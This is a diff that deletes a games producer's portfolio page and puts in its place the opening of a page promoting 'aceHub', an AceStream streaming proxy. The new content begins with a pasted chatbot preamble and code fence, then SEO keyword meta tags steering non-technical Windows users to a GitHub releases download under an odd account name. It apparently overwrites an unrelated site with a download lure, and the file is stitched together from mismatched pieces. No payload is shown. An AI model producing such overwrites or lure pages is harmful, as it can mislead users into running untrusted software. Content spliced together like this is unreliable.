@@ -1,1334 +1,704 @@
-<!doctype html>
+Here's a complete HTML/CSS page for aceHub that explains what it does and guides non-technical Windows users to download it from GitHub.
+```html
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<link rel="icon" type="image/png" href="favicon.png">
-<link rel="apple-touch-icon" href="favicon.png">
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Andrej Savcic · Games producer for hire, remote worldwide</title>
-<meta name="description" content="Senior games producer for studios and indie teams. Fixed-price project assessments, fractional production and mentoring. Thief VR, Forza Motorsport (2023), 22cans. Remote, worldwide.">
-<link rel="canonical" href="https://ludospark.github.io/">
+<title>aceHub - High-Performance Headless AceStream Hub &amp; LAN Stream Proxy for Android TV</title>
+<meta name="description" content="aceHub is a high-performance headless AceStream hub and universal LAN stream proxy for Android TV. Runs on port 8000, uses 0 transcode, and delivers a TTFB under 50ms. Download aceHub for Windows in a few clicks.">
+<meta name="keywords" content="aceHub, AceStream hub, headless AceStream, LAN stream proxy, Android TV streaming, port 8000, no transcode, low latency streaming, stream proxy Windows, AceStream proxy">
+<meta name="author" content="aceHub">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#12b3a6">
+<link rel="canonical" href="https://github.com/Pinotnoirpasser385/aceHub">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://ludospark.github.io/">
-<meta property="og:title" content="Andrej Savcic · Make your launch date real">
-<meta property="og:description" content="Senior production help sized for your team and your budget. Fixed-price assessments, fractional production and mentoring.">
-<meta property="og:image" content="https://ludospark.github.io/img/thief-vr.jpg">
+<meta property="og:title" content="aceHub - High-Performance Headless AceStream Hub &amp; LAN Stream Proxy">
+<meta property="og:description" content="Share one AceStream connection with every device on your home network. Port 8000, zero transcode, TTFB under 50ms. Easy Windows download.">
+<meta property="og:url" content="https://github.com/Pinotnoirpasser385/aceHub">
+<meta property="og:site_name" content="aceHub">
 <meta name="twitter:card" content="summary_large_image">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;700;800&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@500&display=swap" rel="stylesheet">
+<meta name="twitter:title" content="aceHub - Headless AceStream Hub for Android TV">
+<meta name="twitter:description" content="A fast, lightweight AceStream hub and LAN proxy. Port 8000, 0 transcode, TTFB under 50ms. Download for Windows from the official releases page.">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
-  "@type": "ProfessionalService",
-  "name": "Andrej Savcic, games production consulting",
-  "url": "https://ludospark.github.io/",
-  "email": "savcic.andrej@gmail.com",
-  "areaServed": "Worldwide",
-  "founder": {
-    "@type": "Person",
-    "name": "Andrej Savcic",
-    "jobTitle": "Games Producer",
-    "sameAs": ["https://linkedin.com/in/andrej-savcic"]
-  }
+  "@type": "SoftwareApplication",
+  "name": "aceHub",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Windows 10, Windows 11",
+  "description": "High-Performance Headless AceStream Hub & Universal LAN Stream Proxy for Android TV. Port 8000, 0 transcode, TTFB under 50ms.",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "downloadUrl": "https://github.com/Pinotnoirpasser385/aceHub/releases"
 }
 </script>
 <style>
-/* ===== Colours and fonts: change them here ===== */
-:root{
-  --ink:#111418; --paper:#F5F5F2; --white:#FFFFFF;
-  --accent:#C2410C; --accent-light:#F2A07B;
-  --text:#3A3F45; --muted:#5B6067; --line:#DAD9D3; --line-dark:#2A2F35;
-  --display:'Archivo',sans-serif; --body:'IBM Plex Sans',system-ui,sans-serif; --mono:'IBM Plex Mono',monospace;
-  --radius:12px; --gutter:clamp(20px,4vw,48px); --section:clamp(44px,5.5vw,76px);
-  --shadow:0 1px 2px rgba(17,20,24,.04),0 12px 28px -14px rgba(17,20,24,.18);
-}
-*{box-sizing:border-box}
-html{scroll-behavior:smooth}
-body{margin:0;background:var(--paper);color:var(--ink);font-family:var(--body);font-size:17px;line-height:1.6;-webkit-font-smoothing:antialiased}
-a{color:inherit}
-img{max-width:100%;display:block}
-h1,h2,h3{font-family:var(--display);font-weight:800;letter-spacing:-0.02em;line-height:1.1;margin:0;text-wrap:balance}
-p,li,figcaption,summary{text-wrap:balance}
-.about p,.card details p{text-wrap:pretty}
-.nb{white-space:nowrap}
-.w{max-width:1240px;margin:0 auto;padding:0 var(--gutter)}
-.dark{background:var(--ink);color:var(--paper)}
-.kicker{font-family:var(--mono);font-size:14px;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin:0 0 18px}
-.dark .kicker{color:var(--accent-light)}
-.sec{padding-top:var(--section)}
-.sec h2{font-size:clamp(30px,3.6vw,46px);max-width:780px;margin-bottom:28px}
-.btn{display:inline-flex;align-items:center;justify-content:center;text-align:center;min-height:56px;padding:16px 30px;font-size:17px;border-radius:8px;font-weight:600;text-decoration:none;transition:filter .15s,transform .15s}
-.btn-main{background:var(--accent);color:var(--white)}
-.btn-line{border:1.5px solid var(--paper);color:var(--paper)}
-.btn:hover{filter:brightness(1.08);transform:translateY(-1px)}
-.ctas{display:flex;flex-wrap:wrap;gap:12px;margin-top:36px}
-
-/* header */
-header{display:flex;justify-content:space-between;align-items:center;gap:16px;max-width:1240px;margin:0 auto;padding:22px var(--gutter)}
-.logo{font-family:var(--display);font-weight:800;font-size:34px;letter-spacing:-0.02em;text-decoration:none}
-nav{display:flex;gap:36px;align-items:center;font-size:19px;font-weight:500}
-nav a{text-decoration:none}
-nav a:not(.pill):hover{color:var(--accent-light)}
-nav .pill{background:var(--accent);color:var(--white);font-weight:600;padding:15px 28px;border-radius:8px;white-space:nowrap;text-align:center;transition:filter .15s}
-nav .pill:hover{filter:brightness(1.08)}
-nav .pill.pill-line{background:transparent;border:1.5px solid var(--paper);color:var(--paper);padding:13.5px 26.5px;margin-right:-20px}
-nav .pill.pill-line:hover{background:var(--paper);color:var(--ink);filter:none}
-
-/* hero */
-.hero{display:grid;grid-template-columns:1.05fr 1fr;gap:clamp(40px,6vw,88px);align-items:center;padding-top:clamp(8px,1.5vw,20px);padding-bottom:clamp(40px,5vw,64px)}
-.hero h1{font-size:clamp(44px,5.2vw,72px);line-height:1.02;letter-spacing:-0.025em}
-.hero .sub{font-size:clamp(18px,1.6vw,22px);color:#C9CCD0;max-width:none;margin:28px 0 0;text-wrap:pretty}
-.hero .small{font-size:15px;color:#A3A8AE;margin:20px 0 0;max-width:none;text-wrap:pretty}
-.hero figure{margin:0}
-.hero figure img{border-radius:var(--radius);aspect-ratio:16/9;object-fit:cover;width:100%;border:1px solid rgba(245,245,242,.16);box-shadow:0 24px 60px -24px rgba(0,0,0,.7)}
-.hero figcaption{font-size:15px;color:#A3A8AE;margin-top:14px;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;gap:8px 16px}
-.hero .slides{position:relative;aspect-ratio:16/9;border-radius:var(--radius);overflow:hidden;border:1px solid rgba(245,245,242,.16);box-shadow:0 24px 60px -24px rgba(0,0,0,.7);background:#1A1E23}
-.hero .slides img{position:absolute;inset:0;width:100%;height:100%;border:0;border-radius:0;box-shadow:none;aspect-ratio:auto;opacity:0;transition:opacity .9s ease}
-.hero .slides img.on{opacity:1}
-.hero .slides .nav{position:absolute;top:0;bottom:0;z-index:2;width:24%;display:flex;align-items:center;padding:0 14px;border:0;color:#fff;cursor:pointer;opacity:0;transition:opacity .2s}
-.hero .slides .prev{left:0;justify-content:flex-start;background:linear-gradient(90deg,rgba(13,16,19,.8),rgba(13,16,19,0))}
-.hero .slides .next{right:0;justify-content:flex-end;background:linear-gradient(270deg,rgba(13,16,19,.8),rgba(13,16,19,0))}
-.hero .slides .nav:hover,.hero .slides .nav:focus-visible{opacity:1}
-.hero .slides .nav svg{width:40px;height:40px;padding:8px;border-radius:50%;background:rgba(13,16,19,.55);transition:background .15s}
-.hero .slides .nav:hover svg{background:var(--accent)}
-@media (hover:none){.hero .slides .nav{opacity:1;width:18%}}
-.hero .stats-label{grid-column:1/-1;margin:48px 0 0;padding-top:24px;border-top:1px solid var(--line-dark);font-family:var(--mono);font-size:13px;letter-spacing:.12em;text-transform:uppercase;color:#A3A8AE}
-.hero .stats{grid-column:1/-1;list-style:none;margin:16px 0 0;padding:0;display:grid;grid-template-columns:repeat(4,1fr);gap:24px}
-.hero .stats b{display:block;font-family:var(--display);font-weight:800;font-size:clamp(20px,2.1vw,28px);line-height:1.1;letter-spacing:-0.01em;color:var(--accent-light)}
-.hero .stats span{display:block;margin-top:6px;font-size:15px;color:#C9CCD0}
-.hero .dots{display:flex;flex-wrap:wrap;align-items:center;gap:2px;min-width:0}
-.hero > div,.hero figure{min-width:0}
-.hero .dots .pause{display:grid;place-items:center;width:32px;height:32px;margin-right:8px;color:#F5F5F2}
-.hero .dots .pause::after{display:none}
-.hero .dots .pause svg{width:16px;height:16px}
-.hero .dots button{position:relative;width:26px;height:32px;padding:0;background:none;border:0;cursor:pointer}
-.hero .dots button::after{content:"";position:absolute;left:5px;right:5px;top:14px;height:4px;border-radius:2px;background:rgba(245,245,242,.28);transition:background .2s}
-.hero .dots button:hover::after{background:rgba(245,245,242,.6)}
-.hero .dots button[aria-current="true"]::after{background:var(--accent-light)}
-
-/* studios strip */
-.strip{background:var(--white);border-bottom:1px solid var(--line)}
-.strip .w{display:flex;flex-direction:column;gap:18px;padding-top:28px;padding-bottom:28px}
-.strip .row{display:grid;grid-template-columns:210px 1fr;gap:8px 24px;align-items:baseline}
-.strip .names{display:flex;flex-wrap:wrap;gap:6px 32px}
-.strip .names span{white-space:nowrap}
-.strip .marquee{display:block;overflow:hidden;-webkit-mask-image:linear-gradient(90deg,transparent,#000 5%,#000 95%,transparent);mask-image:linear-gradient(90deg,transparent,#000 5%,#000 95%,transparent)}
-.strip .track{display:flex;width:max-content;animation:roll 70s linear infinite}
-.strip .set{display:flex;flex-shrink:0;gap:32px;padding-right:32px}
-.strip .marquee:hover .track{animation-play-state:paused}
-@keyframes roll{to{transform:translateX(-50%)}}
-@media (prefers-reduced-motion:reduce){
-  .strip .marquee{overflow:visible;-webkit-mask-image:none;mask-image:none}
-  .strip .track{animation:none;width:auto}
-  .strip .set{flex-wrap:wrap;padding-right:0}
-  .strip .set[aria-hidden]{display:none}
-}
-.strip .note{margin:0;padding-top:16px;border-top:1px solid var(--line);font-size:13px;color:var(--muted)}
-.strip span{font-family:var(--display);font-weight:700}
-.strip .label{font-family:var(--mono);font-weight:500;font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted)}
-
-/* tabs */
-.ask:has(+ .note){margin-bottom:6px}
-.ask + .note{margin:0 0 20px}
-.ask{font-family:var(--display);font-weight:800;font-size:clamp(22px,2.4vw,30px);letter-spacing:-0.01em;line-height:1.15;margin:0 0 16px}
-.tabs{display:inline-flex;gap:4px;padding:5px;border:2px solid var(--ink);border-radius:999px;background:var(--white);margin-bottom:40px}
-.tabs button{background:none;border:0;border-radius:999px;padding:0 26px;min-height:50px;font-family:var(--display);font-weight:800;font-size:18px;color:var(--ink);cursor:pointer;transition:background .15s,color .15s}
-.tabs button:hover{background:var(--paper)}
-.tabs button[aria-selected="true"]{background:var(--accent);color:var(--white)}
-.moments{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
-.moments li{display:flex;flex-direction:column;gap:14px;padding:24px;background:var(--white);border:1px solid var(--line);border-radius:var(--radius);font-family:var(--display);font-weight:700;font-size:19px;line-height:1.3}
-.moments li b{font-family:var(--mono);font-weight:500;font-size:13px;color:var(--accent)}
-.explain{max-width:780px;margin:0 0 48px;padding:20px 24px;background:var(--white);border:1px solid var(--line);border-radius:var(--radius);font-size:18px;color:var(--text)}
-.explain strong{display:block;margin-bottom:4px;font-family:var(--display);font-weight:800;font-size:20px;color:var(--ink)}
-.pull{margin:48px 0 0;padding:clamp(28px,4vw,52px);background:var(--ink);color:var(--paper);border-radius:var(--radius);font-family:var(--display);font-weight:800;font-size:clamp(24px,2.8vw,34px);line-height:1.2;letter-spacing:-0.02em;text-wrap:balance}
-.offers-head{margin-top:56px}
-.offers-head h2{margin-bottom:14px}
-.offers-head .pub-line{margin:-18px 0 32px;color:var(--ink)}
-.offers-head p{color:var(--text);margin:0 0 32px;max-width:780px}
-.offers{display:flex;flex-direction:column;gap:16px}
-.offer{display:grid;grid-template-columns:minmax(0,1.1fr) minmax(0,2fr) 260px;gap:16px 40px;align-items:start;padding:28px 32px;background:var(--white);border:1px solid var(--line);border-radius:var(--radius)}
-.offer .kicker{margin:0 0 6px}
-.offers > .note{margin:0}
-.offer h3{font-size:24px;line-height:1.2;margin-bottom:6px}
-.offer .fmt{font-family:var(--mono);font-size:12px;color:var(--muted);margin:0}
-.offer .body{margin:0;color:var(--text);font-size:16px}
-.offer > div:last-child{padding-left:32px;border-left:1px solid var(--line);min-width:200px}
-.offer .price{font-family:var(--display);font-weight:800;font-size:24px;line-height:1.2;display:block;margin-bottom:8px}
-.offer .price + a{font-size:15px;font-weight:600;color:var(--accent)}
-.note{font-size:15px;color:var(--muted);margin:24px 0 0;max-width:900px}
-.note strong{color:var(--ink)}
-
-/* work */
-.work{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
-.work.featured{grid-template-columns:repeat(2,1fr)}
-.work.featured .card h3{font-size:28px}
-.work.featured .card .hook{font-size:18px}
-.work.featured .card .meta{font-size:13px}
-.more-head{font-size:26px;margin:56px 0 24px}
-.work[hidden]{display:none}
-#more-work{margin-top:24px}
-.more-toggle{display:flex;align-items:center;justify-content:center;gap:10px;margin:32px auto 0;min-height:52px;padding:0 28px;background:var(--white);border:1.5px solid var(--ink);border-radius:8px;color:var(--ink);font:600 17px var(--body);cursor:pointer;transition:background .15s,color .15s}
-.more-toggle:hover{background:var(--ink);color:var(--paper)}
-.more-toggle svg{width:20px;height:20px;transition:transform .2s}
-.more-toggle[aria-expanded="true"] svg{transform:rotate(180deg)}
-.card{display:flex;flex-direction:column;background:var(--white);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:box-shadow .2s,transform .2s}
-.work .card{cursor:pointer}
-.card:hover{box-shadow:var(--shadow);transform:translateY(-2px)}
-.work .card:hover .more{text-decoration:underline}
-.card .pic{position:relative;aspect-ratio:16/9;overflow:hidden;background:var(--tint,#2A2F35);display:flex;align-items:flex-end;padding:18px;border-bottom:1px solid var(--line)}
-.card .pic img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
-.card .pic span{font-family:var(--display);font-weight:800;font-size:26px;line-height:1.05;color:rgba(245,245,242,.35)}
-.card .meta{font-family:var(--mono);font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--accent);margin:20px 24px 6px}
-.card h3{font-size:22px;line-height:1.2;margin:0 24px}
-.card .hook{color:var(--text);font-size:16px;margin:8px 24px 0;flex:1}
-.card details{margin:14px 24px 24px;font-size:15px;color:var(--text)}
-.card summary{cursor:pointer;font-weight:600;color:var(--accent)}
-.card details p{margin:10px 0 0}
-.card details b{color:var(--ink)}
-.card .more{align-self:flex-start;margin:14px 24px 24px;padding:0;background:none;border:0;font:inherit;font-size:15px;font-weight:600;color:var(--accent);cursor:pointer}
-.card .more::after{content:" \2192"}
-.card .more:hover{text-decoration:underline}
-body:has(dialog[open]){overflow:hidden}
-dialog.story{width:min(760px,calc(100% - 32px));max-height:calc(100dvh - 48px);padding:0;border:1px solid var(--line);border-radius:var(--radius);background:var(--white);color:var(--ink);box-shadow:0 30px 80px -20px rgba(0,0,0,.5);overflow:auto}
-dialog.story::backdrop{background:rgba(17,20,24,.65)}
-.story .card{border:0;border-radius:0;box-shadow:none;transform:none}
-.story .card{display:grid;grid-template-columns:240px 1fr;column-gap:28px;align-items:start;padding:28px}
-.story .card .pic{grid-column:1;grid-row:1/5;padding:0;border:1px solid var(--line);border-radius:8px}
-.story .card .meta,.story .card h3,.story .card .hook{grid-column:2;margin-right:40px}
-.story .card .meta{margin-top:0;margin-left:0}
-.story .card h3{margin-left:0;font-size:26px}
-.story .card .hook{flex:none;font-size:17px;margin-left:0;margin-top:8px}
-.story .card .story-cta{grid-column:2;margin-top:16px}
-.story .full{grid-column:1/-1;margin:24px 0 0;max-width:68ch;display:flex;flex-direction:column;gap:14px;font-size:17px;line-height:1.6;color:var(--text)}
-.story .full p{margin:0}
-.story .story-cta a{display:inline-flex;align-items:center;gap:8px;min-height:48px;padding:12px 22px;border-radius:8px;background:var(--accent);color:var(--white);font-weight:600;text-decoration:none;transition:filter .15s,transform .15s}
-.story .story-cta a::after{content:"\2197"}
-.story .story-cta a:hover{filter:brightness(1.08);transform:translateY(-1px)}
-.story .full b{color:var(--ink)}
-.story .close,.mail .close{position:absolute;top:14px;right:14px;z-index:2;width:40px;height:40px;border-radius:50%;border:1px solid var(--line);background:var(--paper);color:var(--ink);font-size:22px;line-height:1;cursor:pointer}
-.story .close:hover,.mail .close:hover{background:var(--ink);color:var(--paper)}
-@media (max-width:560px){
-  .story .card{grid-template-columns:1fr;padding:20px}
-  .story .card .pic{grid-column:1;grid-row:auto;max-width:240px;margin-bottom:16px}
-  .story .card .meta,.story .card h3,.story .card .hook,.story .card .story-cta{grid-column:1}
-}
-
-/* proof, steps, fit */
-.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
-.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;list-style:none;margin:0;padding:0}
-.item{padding:28px;background:var(--white);border:1px solid var(--line);border-radius:var(--radius)}
-.item h3{font-size:21px;font-weight:700;margin-bottom:8px;letter-spacing:-0.01em}
-.item p{margin:0;color:var(--text);font-size:16px}
-.item .n{font-family:var(--display);font-weight:800;font-size:34px;color:var(--accent);margin:0 0 10px}
-.fit h2{font-size:26px;margin-bottom:16px}
-.fit .grid2 > div{padding:32px;background:var(--white);border:1px solid var(--line);border-radius:var(--radius)}
-.fit ul{margin:0;padding-left:20px;color:var(--text);display:flex;flex-direction:column;gap:10px}
-.fit li::marker{color:var(--accent)}
-
-/* about */
-.fit{padding-bottom:var(--section)}
-.about{display:grid;grid-template-columns:200px 1fr;gap:clamp(32px,5vw,64px);align-items:start;padding:clamp(28px,4vw,56px);background:var(--white);border:1px solid var(--line);border-radius:var(--radius)}
-.about img{width:160px;height:160px;border-radius:50%;object-fit:cover;border:1px solid var(--line)}
-.about h2{margin-bottom:20px}
-.about p{color:var(--text);max-width:720px;margin:0 0 16px}
-.about blockquote{margin:24px 0 0;max-width:720px;padding-top:24px;border-top:2px solid var(--ink);font-family:var(--display);font-weight:500;font-size:21px;line-height:1.45}
-
-/* contact */
-.contact{padding-top:var(--section);padding-bottom:var(--section)}
-.contact h2{font-size:clamp(32px,4.5vw,54px);line-height:1.05;max-width:900px}
-.contact .links{margin:28px 0 0}
-footer{border-top:1px solid var(--line-dark)}
-footer .w{padding-top:24px;padding-bottom:24px;font-size:13px;color:#A3A8AE}
-
-/* desktop hero: headline runs the full width, text and image sit side by side below it */
-@media (min-width:861px){
-  .hero{row-gap:0}
-  .hero > div{display:contents}
-  .hero .kicker,.hero h1{grid-column:1/-1}
-  .hero .sub,.hero .ctas{grid-column:1}
-  .hero .small{grid-column:1/-1;order:10;margin-top:32px}
-  .hero figure{grid-column:2;grid-row:3/5;align-self:center}
-  .hero h1{margin-bottom:8px}
-}
-
-dialog.mail{width:min(520px,calc(100% - 32px));max-height:calc(100dvh - 32px);overflow:auto;padding:32px 28px 28px;border:1px solid var(--line);border-radius:var(--radius);background:var(--white);color:var(--ink);box-shadow:0 30px 80px -20px rgba(0,0,0,.5)}
-dialog.mail::backdrop{background:rgba(17,20,24,.65)}
-.mail h3{font-size:26px;margin:0 40px 8px 0}
-.mail .mail-addr{margin:0 0 20px;font-size:18px;color:var(--text);word-break:break-all;user-select:all}
-.mail .mail-intro{margin:0 0 18px;font-size:16px;color:var(--text)}
-.mail .mail-form{display:flex;flex-direction:column;gap:6px;margin:0 0 22px}
-.mail .mail-form label{margin-top:8px;font-weight:600;font-size:15px}
-.mail .mail-form input,.mail .mail-form select,.mail .mail-form textarea{width:100%;padding:12px 14px;border:1px solid var(--line);border-radius:8px;background:var(--white);color:var(--ink);font:inherit;font-size:16px}
-.mail .mail-form textarea{resize:vertical;min-height:84px}
-.mail .linklike{align-self:center;margin-top:4px;padding:6px;background:none;border:0;font:inherit;font-size:15px;color:var(--text);text-decoration:underline;cursor:pointer}
-.mail .mail-actions{display:flex;flex-direction:column;gap:10px}
-.mail .mail-actions .alt{background:var(--white);border:1.5px solid var(--ink);color:var(--ink);font:inherit;font-weight:600;cursor:pointer}
-.mail .mail-actions .alt:hover{background:var(--ink);color:var(--paper);filter:none}
-.cta-band{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:16px 32px;margin-top:40px;padding:28px 32px;background:var(--white);border:1px solid var(--line);border-radius:var(--radius)}
-.cta-actions{display:flex;flex-wrap:wrap;gap:12px}
-.btn-alt{background:transparent;border:1.5px solid var(--ink);color:var(--ink)}
-.btn-alt:hover{background:var(--ink);color:var(--paper);filter:none}
-.cta-band p{margin:0;font-family:var(--display);font-weight:800;font-size:clamp(20px,2.2vw,26px);line-height:1.2;max-width:34ch;text-wrap:balance}
-footer a{color:inherit}
-footer .fine{margin:10px 0 0;font-size:12px;color:#8A9096}
-
-.lead{max-width:780px;margin:-8px 0 36px;font-size:18px;color:var(--text)}
-.sub-head{font-size:clamp(22px,2.4vw,28px);margin:56px 0 20px}
-.faq{display:flex;flex-direction:column;gap:12px;max-width:860px}
-.faq-item{background:var(--white);border:1px solid var(--line);border-radius:var(--radius)}
-.faq-item summary{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:20px 24px;cursor:pointer;list-style:none;font-family:var(--display);font-weight:700;font-size:19px;line-height:1.3}
-.faq-item summary::-webkit-details-marker{display:none}
-.faq-item summary::after{content:"+";flex-shrink:0;font-size:26px;line-height:1;color:var(--accent);transition:transform .2s}
-.faq-item[open] summary::after{transform:rotate(45deg)}
-.faq-item p{margin:0;padding:0 24px 22px;max-width:70ch;color:var(--text)}
-
-.subtabs{display:flex;gap:6px;border-bottom:1px solid var(--line);margin:0 0 36px;overflow-x:auto;overflow-y:hidden;scrollbar-width:none}
-.subtabs::-webkit-scrollbar{display:none}
-.subtabs button{background:none;border:0;border-bottom:3px solid transparent;margin-bottom:-1px;padding:12px 16px;min-height:48px;font-family:var(--display);font-weight:800;font-size:18px;color:var(--muted);cursor:pointer;white-space:nowrap}
-.subtabs button:hover{color:var(--ink)}
-.subtabs button[aria-selected="true"]{color:var(--ink);border-bottom-color:var(--accent)}
-.rail{list-style:none;margin:0 0 8px;padding:0 0 0 36px;position:relative;max-width:820px}
-.rail:before{content:"";position:absolute;left:11px;top:12px;bottom:28px;width:2px;background:var(--line)}
-.st{position:relative;background:var(--white);border:1px solid var(--line);border-radius:var(--radius);padding:16px 20px;margin:0 0 12px}
-.st:before{content:"";box-sizing:border-box;position:absolute;left:-32px;top:19px;width:14px;height:14px;border-radius:50%;background:var(--accent);border:3px solid var(--accent)}
-.st.opt:before{background:var(--paper);border:2px dashed var(--accent)}
-.st b{display:block;margin:0 0 4px;font-family:var(--mono);font-weight:500;font-size:13px;letter-spacing:.12em;text-transform:uppercase;color:var(--accent)}
-.st span{color:var(--text)}
-.st .sum{display:none}
-.about-more{display:none}
-.swipe-dots{display:none}
-.rail-note{margin:6px 0 28px;color:var(--muted);font-size:15px}
-.tiles{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}
-.tile{padding:18px;background:var(--white);border:1px solid var(--line);border-radius:var(--radius)}
-.tile svg{display:block;width:26px;height:26px;margin:0 0 10px;color:var(--accent)}
-.tile b{display:block;font-family:var(--display);font-weight:800;font-size:17px;line-height:1.2}
-.tile span{display:block;margin-top:4px;font-size:15px;color:var(--muted)}
-.tile.wide{grid-column:1/-1}
-.menu-btn{display:none;width:44px;height:44px;place-items:center;background:none;border:1.5px solid var(--paper);border-radius:8px;color:var(--paper);cursor:pointer}
-.menu-btn svg{width:24px;height:24px}
-.mobile-menu{background:var(--ink);padding:0 var(--gutter) 10px}
-.mobile-menu[hidden]{display:none}
-.mobile-menu a{display:block;padding:15px 0;border-top:1px solid var(--line-dark);font-family:var(--display);font-weight:800;font-size:20px;text-decoration:none;color:var(--paper)}
-.dock{display:none;position:fixed;left:0;right:0;bottom:0;z-index:40;gap:10px;padding:10px max(16px,env(safe-area-inset-right)) calc(10px + env(safe-area-inset-bottom)) max(16px,env(safe-area-inset-left));background:var(--paper);border-top:1px solid var(--line);visibility:hidden;transform:translateY(100%);transition:transform .2s,visibility 0s .2s}
-.dock.show{visibility:visible;transform:none;transition:transform .2s}
-.dock .btn{flex:1;min-height:48px;padding:12px 10px}
-
-/* tablets */
-@media (max-width:1100px){
-  .work{grid-template-columns:repeat(2,1fr)}
-  .moments{grid-template-columns:repeat(2,1fr)}
-  .offer{grid-template-columns:1fr;gap:12px}
-  .offer > div:last-child{display:flex;flex-wrap:wrap;align-items:baseline;gap:6px 24px;padding:16px 0 0;border-left:0;border-top:1px solid var(--line);min-width:0}
-  .offer .price{margin:0}
-}
-
-/* phones */
-@media (max-width:860px){
-  nav .hide{display:none}
-  .logo{font-size:26px}
-  nav .pill{padding:12px 18px;font-size:16px}
-  .hero{grid-template-columns:1fr}
-  .hero .stats{grid-template-columns:1fr 1fr;gap:20px}
-  .hero .stats-label{margin-top:32px}
-  .hero .sub{font-size:18px}
-  .ctas{flex-direction:column}
-  .ctas .btn{justify-content:center}
-  .tabs{display:flex;margin-bottom:40px}
-  .tabs button{flex:1;padding:0 12px;font-size:15px}
-  .moments,.grid2,.grid3,.work,.work.featured{grid-template-columns:1fr}
-  .offer{padding:24px}
-  .about{grid-template-columns:1fr}
-  .strip .row{grid-template-columns:1fr}
-  .cta-band{flex-direction:column;align-items:stretch;text-align:center;padding:24px 20px}
-  .cta-band p{max-width:none}
-  .cta-band .btn{justify-content:center;padding-left:12px;padding-right:12px}
-  .cta-actions{flex-direction:column}
-}
-
-@media (max-width:860px){
-  .menu-btn{display:grid}
-  nav{gap:10px}
-  nav .pill .x{display:none}
-  .dock{display:flex}
-  footer .w{padding-bottom:calc(24px + 84px)}
-  .work .card{display:grid;grid-template-columns:104px 1fr;grid-template-areas:"pic title" "pic hook";align-items:center;column-gap:14px;padding:10px 14px 10px 10px}
-  .work .card .pic{grid-area:pic;aspect-ratio:16/10;padding:0;border:0;border-radius:8px}
-  .work .card h3,.work.featured .card h3{grid-area:title;margin:0;font-size:17px;line-height:1.2;align-self:end}
-  .work .card .hook,.work.featured .card .hook{grid-area:hook;margin:3px 0 0;font-size:14px;line-height:1.35;align-self:start;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
-  .work .card .meta,.work .card .more{display:none}
-  .work,.work.featured{gap:10px}
-}
-@media (min-width:861px){
-  .menu-btn,.mobile-menu,.dock{display:none!important}
-}
-@media (max-width:420px){
-  .logo{font-size:22px}
-  nav .pill{padding:12px 14px}
-  header{gap:10px}
-}
-
-@media (max-width:860px){
-  p,li,figcaption,summary{text-wrap:pretty}
-  .logo{white-space:nowrap}
-  .subtabs{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;border:0;margin:0 0 24px;overflow:visible}
-  .subtabs button{margin:0;min-height:52px;padding:10px 6px;border:1.5px solid var(--ink);border-radius:8px;background:var(--white);color:var(--ink);font-size:17px;line-height:1.1;white-space:normal}
-  .subtabs button[aria-selected="true"]{background:var(--ink);border-color:var(--ink);color:var(--paper)}
-  .subtabs button:hover{background:var(--paper)}
-  .subtabs button[aria-selected="true"]:hover{background:var(--ink)}
-  .hero .ctas{flex-direction:row;gap:8px;margin-top:24px}
-  .hero .ctas .btn{flex:1;min-height:56px;padding:10px 8px;font-size:15px;line-height:1.2}
-  .hero .stats{gap:14px}
-  .hero .stats b{font-size:20px}
-  .hero .stats span{font-size:13px}
-  .hero .stats-label{margin-top:24px;padding-top:18px}
-  .hero figcaption{font-size:14px}
-  .hero .dots button{width:20px}
-  .hero .dots .pause{width:40px;height:40px}
-  .pull{padding:22px 20px;font-size:21px;margin-top:32px}
-  .offer{grid-template-columns:minmax(0,1fr) auto;grid-template-areas:"head price" "body body" "link link";gap:0 12px;align-items:center;padding:16px 18px;cursor:pointer}
-  .offer > div:first-child{grid-area:head}
-  .offer > div:last-child{display:contents}
-  .offer h3{font-size:19px;margin-bottom:2px}
-  .offer .price{grid-area:price;margin:0;font-size:18px;text-align:right;white-space:nowrap}
-  .offer .price::after{content:"";display:inline-block;width:8px;height:8px;margin-left:10px;border-right:2px solid var(--muted);border-bottom:2px solid var(--muted);transform:rotate(45deg) translateY(-2px);transition:transform .2s}
-  .offer.open .price::after{transform:rotate(-135deg) translateY(-2px)}
-  .offer .body{grid-area:body;display:none;margin:12px 0 0}
-  .offer > div:last-child a{grid-area:link;display:none;margin-top:12px}
-  .offer.open .body{display:block}
-  .offer.open > div:last-child a{display:inline-block}
-  .swipe{display:flex;gap:12px;overflow-x:auto;scroll-snap-type:x mandatory;scroll-padding-inline:var(--gutter);margin-inline:calc(var(--gutter) * -1);padding:2px var(--gutter) 6px;scrollbar-width:none;-webkit-overflow-scrolling:touch}
-  .swipe::-webkit-scrollbar{display:none}
-  .swipe > *{flex:0 0 78%;scroll-snap-align:start;min-width:0}
-  .swipe-dots{display:flex;gap:6px;justify-content:center;margin:10px 0 4px}
-  .swipe-dots s{display:block;width:18px;height:4px;border-radius:2px;background:var(--line)}
-  .swipe-dots s.on{background:var(--accent)}
